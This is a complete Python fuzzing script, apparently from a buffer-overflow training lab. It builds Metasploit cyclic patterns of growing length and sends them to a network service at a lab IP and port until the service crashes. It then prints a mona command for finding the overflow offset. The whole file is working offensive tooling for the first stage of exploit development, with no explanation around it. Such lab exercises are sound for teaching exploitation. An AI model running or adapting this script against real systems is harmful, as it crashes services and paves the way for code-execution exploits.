import socket, time, sys, subprocess

patterncreate = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
ip = "10.10.93.84"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

print(prefix)

n = 1
while n <= 30:
    child = subprocess.Popen([patterncreate,'-l',str(n*100)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    buffer = str(child.stdout.read())

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(buffer))
        s.send(prefix + buffer + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to %s:%s" % (ip, port))
        print("Test with: !mona findmsp -distance %s" % len(buffer))
        sys.exit(0)

    time.sleep(1)
    n += 1